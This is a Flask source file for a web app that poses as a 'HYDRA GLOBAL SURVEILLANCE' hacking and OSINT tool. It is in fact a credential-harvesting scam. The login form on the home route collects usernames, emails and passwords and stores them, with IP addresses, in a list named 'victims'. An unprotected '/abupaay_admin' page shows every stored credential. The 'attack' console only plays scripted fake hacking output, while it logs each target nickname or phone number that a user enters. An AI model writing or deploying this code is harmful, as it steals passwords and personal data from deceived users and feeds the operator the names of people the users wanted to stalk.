from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_GOD_MODE_PROJECT_2026'

db = {"victims": [], "logs": []}

# --- САМЫЙ ЖИРНЫЙ ДИЗАЙН (3D MATRIX + NEON) ---
FINAL_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA ULTIMATE v5.0</title>
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
        .overlay { position: relative; z-index: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .terminal-window { width: 800px; height: 500px; background: rgba(5, 5, 5, 0.95); border: 2px solid #bc13fe; box-shadow: 0 0 40px #bc13fe; padding: 20px; border-radius: 5px; }
        .header { color: #0ff; text-align: center; font-size: 24px; text-transform: uppercase; border-bottom: 1px solid #bc13fe; padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px #0ff; }
        .input-group { display: flex; gap: 10px; margin-bottom: 20px; }
        input { background: transparent; border: 1px solid #0f0; color: #0f0; flex: 1; padding: 10px; font-family: monospace; font-size: 16px; outline: none; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 10px 25px; cursor: pointer; font-weight: bold; font-size: 14px; box-shadow: 0 0 10px #bc13fe; }
        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 20px #0ff; }
        #console { height: 300px; overflow-y: auto; background: #000; border: 1px solid #333; padding: 10px; font-size: 13px; color: #0f0; }
        .status-bar { margin-top: 10px; display: flex; justify-content: space-between; font-size: 10px; color: #555; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="overlay">
        <div class="terminal-window">
            <div class="header">>> HYDRA GLOBAL SURVEILLANCE v5.0 <<</div>
            <div class="input-group">
                <input id="target" placeholder="ENTER TARGET NICKNAME OR PHONE...">
                <button class="btn" onclick="execute()">EXECUTE ATTACK</button>
            </div>
            <div id="console">> INITIALIZING OSINT KERNEL...<br>> READY FOR OPERATIONS.</div>
            <div class="status-bar">
                <span>ENCRYPTION: AES-256</span>
                <span>SYSTEM: STABLE</span>
                <span>PROXY: ACTIVE</span>
            </div>
        </div>
        <div style="margin-top: 20px; font-size: 12px;">
            <a href="/abupaay_admin" style="color:#bc13fe; text-decoration:none;">[ ADMINISTRATION PORTAL ]</a>
        </div>
    </div>

    <script>
        // MATRIX BACKGROUND
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@&%*";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#bc13fe';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);

        // ATTACK LOGIC
        function execute() {
            const val = document.getElementById('target').value;
            const con = document.getElementById('console');
            if(!val) return;

            // Log to admin
            fetch('/api/log_action', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target: val})
            });

            con.innerHTML = "";
            let steps = [
                `[!] TARGETING: ${val}`,
                `[*] BYPASSING FIREWALLS... OK`,
                `[*] EXPLOITING SSL HANDSHAKE... SUCCESS`,
                `[*] DOWNLOADING PRIVATE METADATA... 15%`,
                `[*] DOWNLOADING PRIVATE METADATA... 48%`,
                `[*] DOWNLOADING PRIVATE METADATA... 100%`,
                `[+] LOCATION DETECTED: UZBEKISTAN (TASHKENT)`,
                `[+] PHONE LINKED: +998 (XX) XXX-XX-XX`,
                `[+] FOUND ACCOUNTS: INSTAGRAM, TELEGRAM, TIKTOK`,
                `[!!!] DECRYPTION COMPLETE. ACCESSING SYSTEM...`
            ];

            let i = 0;
            const logInterval = setInterval(() => {
                con.innerHTML += `<br>> ${steps[i]}`;
                con.scrollTop = con.scrollHeight;
                i++;
                if(i >= steps.length) {
                    clearInterval(logInterval);
                    con.innerHTML += `<br><br><span style="color:#0ff">FULL REPORT GENERATED. CHECK LINK: <a href="https://instagram.com/${val}" target="_blank" style="color:#fff">VIEW_DOSSIER</a></span>`;
                }
            }, 600);
        }
    </script>
</body>
</html>
"""

# --- BACKEND LOGIC ---
@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><head><style>body{{background:#000;color:#bc13fe;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}} .box{{border:2px solid #bc13fe;padding:40px;text-align:center;box-shadow:0 0 20px #bc13fe;}} input{{background:transparent;border:1px solid #0ff;color:#0f0;padding:10px;margin:10px;width:250px;}} .btn{{background:#bc13fe;color:#fff;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;}}</style></head><body><div class='box'><h1>// HYDRA AUTHENTICATION //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='USER'><br><input name='e' placeholder='EMAIL'><br><input name='p' type='password' placeholder='PASS'><br><button class='btn'>ENTER SYSTEM</button></form></div></body></html>"
    return render_template_string(FINAL_UI)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr})
    session['reg'] = True
    return redirect('/')

@app.route('/api/log_action', methods=['POST'])
def log_act():
    db['logs'].append({"target": request.json['target'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/abupaay_admin')
def admin():
    u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    l_list = "".join([f"<tr><td>{x['target']}</td><td>{x['time']}</td></tr>" for x in db['logs']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>HYDRA MASTER ADMIN</h1><h3>VICTIMS & CREDENTIALS</h3><table border='1' width='100%'><tr><th>User</th><th>Email</th><th>Pass</th><th>IP Address</th></tr>{u_list}</table><h3>REAL-TIME LOGS</h3><table border='1' width='100%'><tr><th>Search Target</th><th>Timestamp</th></tr>{l_list}</table><br><a href='/' style='color:#bc13fe'>BACK</a></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
